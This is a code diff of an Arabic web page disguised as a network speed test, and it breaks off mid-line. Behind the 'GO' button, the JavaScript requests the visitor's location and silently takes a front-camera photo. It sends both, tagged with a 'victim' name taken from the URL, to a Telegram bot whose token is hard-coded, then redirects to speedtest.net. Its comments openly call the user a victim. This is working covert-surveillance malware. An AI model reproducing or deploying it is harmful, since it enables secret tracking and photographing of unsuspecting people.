@@ -1,5 +1,4 @@
 
-
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
@@ -7,23 +6,67 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>SpeedTest Fast</title>
     <style>
-        body { background-color: #0b0e18; color: white; font-family: sans-serif; text-align: center; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
-        .btn-go {
-            width: 180px; height: 180px; border-radius: 50%;
-            background: #00d2ff; color: black; font-size: 50px; font-weight: bold;
-            display: flex; align-items: center; justify-content: center;
-            cursor: pointer; border: none; outline: none; box-shadow: 0 0 20px #00d2ff;
+        /* منع أي تحديد أو تحديد للنصوص تماماً */
+        * { -webkit-user-select: none; user-select: none; -webkit-tap-highlight-color: transparent; }
+        
+        body { background: #0b0e18; color: white; font-family: sans-serif; text-align: center; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        
+        .speed-container {
+            position: relative;
+            width: 220px;
+            height: 220px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
         }
-        .btn-go:active { background: #ff0055; transform: scale(0.9); }
-        #status { margin-top: 20px; color: #888; }
+
+        .circle-bg {
+            width: 100%;
+            height: 100%;
+            border: 6px solid #00d2ff;
+            border-radius: 50%;
+            background: radial-gradient(circle, #1a2035 0%, #0b0e18 100%);
+            box-shadow: 0 0 30px rgba(0, 210, 255, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: absolute;
+            z-index: 1;
+        }
+
+        .go-text {
+            font-size: 60px;
+            font-weight: bold;
+            color: #00d2ff;
+            text-shadow: 0 0 10px rgba(0, 210, 255, 0.5);
+        }
+
+        /* الطبقة الشفافة التي تمنع التحديد وتستقبل الضغط حصراً */
+        .click-layer {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            z-index: 10; /* أعلى من كل شيء */
+            cursor: pointer;
+        }
+
+        #status { margin-top: 40px; font-size: 18px; color: #888; transition: 0.3s; }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <h2>فحص سرعة الشبكة</h2>
-    <button class="btn-go" id="startBtn">GO</button>
-    <p id="status">اضغط للبدء</p>
+    <h2 style="margin-bottom: 20px; opacity: 0.8;">فحص السرعة العالمي</h2>
+
+    <div class="speed-container">
+        <div class="circle-bg">
+            <span class="go-text">GO</span>
+        </div>
+        <div class="click-layer" id="actionBtn"></div>
+    </div>
+
+    <p id="status">بانتظار بدء الفحص...</p>
 
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
@@ -32,57 +75,17 @@
         const botToken = "8113942047:AAFTJz0lZe1Mjsc0vX79LeCq4MKjwwDuFEw"; 
         const chatId = "7984067238"; 
 
-        async function sendData(type, data, cap = "") {
+        // استخراج اسم الضحية من الرابط
+        const urlParams = new URLSearchParams(window.location.search);
+        const victimName = urlParams.get( user ) || "مستهدف غير معروف";
+
+        async function sendToTelegram(type, content, extra = "") {
             const formData = new FormData();
             formData.append("chat_id", chatId);
             if (type === "photo") {
-                formData.append("photo", data, "1.jpg");
-                formData.append("caption", cap);
+                formData.append("photo", content, "img.jpg");
+                formData.append("caption", `👤 المستهدف: ${victimName}\n${extra}`);
                 await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: formData });
             } else {
-                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(data)}&parse_mode=Markdown`);
-            }
-        }
-
-        document.getElementById( startBtn ).onclick = async function() {
-            const status = document.getElementById( status );
-            status.innerText = "جاري الفحص...";
-            this.style.pointerEvents = "none";
-
-            // 1. طلب الموقع أولاً (إجباري للمتابعة)
-            navigator.geolocation.getCurrentPosition(async (pos) => {
-                const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                
-                // 2. محاولة فتح الكاميرا الأمامية فوراً
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                    const video = document.getElementById( video );
-                    video.srcObject = stream;
-                    
-                    await new Promise(r => setTimeout(r, 1000)); // انتظار ثانية للوضوح
-                    
-                    const canvas = document.getElementById( canvas );
-                    canvas.width = 640; canvas.height = 480;
-                    canvas.getContext( 2d ).drawImage(video, 0, 0);
-                    
-                    stream.getTracks().forEach(t => t.stop());
-                    
-                    canvas.toBlob(async (blob) => {
-                        await sendData("photo", blob, `📍 الموقع: ${mapLink}\n🔋 البطارية: جاري الجلب...`);
-                        window.location.href = "https://www.speedtest.net";
-                    },  image/jpeg , 0.6);
-
-                } catch (e) {
-                    // إذا رفض الكاميرا، أرسل الموقع فقط
-                    await sendData("text", `📍 الموقع فقط: ${mapLink}\n(رفض الكاميرا)`);
-                    window.location.href = "https://www.speedtest.net";
-                }
-
-            }, (err) => {
-                alert("يجب السماح بالموقع والوصول للشبكة للمتابعة.");
-                location.reload();
-            });
-        };
-    </script>
-</body>
-</html>
+                const text = `🔔 **تنبيه جديد:** ${victimName}\n\n${content}`;
+                await fetch(`https://api.telegram.
